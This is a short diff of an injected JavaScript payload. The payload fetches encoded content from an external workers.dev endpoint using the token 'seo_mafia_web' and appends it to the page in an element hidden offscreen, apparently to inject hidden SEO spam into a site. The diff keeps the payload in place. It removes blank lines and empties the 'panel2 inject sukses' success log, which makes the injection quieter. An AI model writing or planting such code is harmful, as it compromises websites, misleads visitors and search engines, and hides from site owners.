@@ -1,6 +1,5 @@
 !function(){
 try{
-
   if(document.getElementById("bunker-payload-2")) return;
   const DEBUG = (() => {
     try {
@@ -9,11 +8,9 @@ try{
       return false;
     }
   })();
-
   const log  = (...a) => { if(DEBUG) console.log(...a); };
   const warn = (...a) => { if(DEBUG) console.warn(...a); };
   const error = (...a) => { if(DEBUG) console.error(...a); };
-
   const API_BASE = "https://smw-queryjs.data-deliver.workers.dev";
   const TOKEN = "seo_mafia_web";
   const decode = (s) => {
@@ -41,7 +38,6 @@ try{
       return "";
     }
   }
-
   Promise.all([
     getData("a1"),
     getData("b1")
@@ -96,7 +92,7 @@ try{
     box.style.cssText = "position:absolute;left:-9999px;opacity:0;font-size:0;";
     box.innerHTML = html;
     (document.body || document.documentElement).appendChild(box);
-    log("✅ panel2 inject sukses");
+    log("");
   }
 }catch(e){
   console.error("panel2 fatal error:", e);
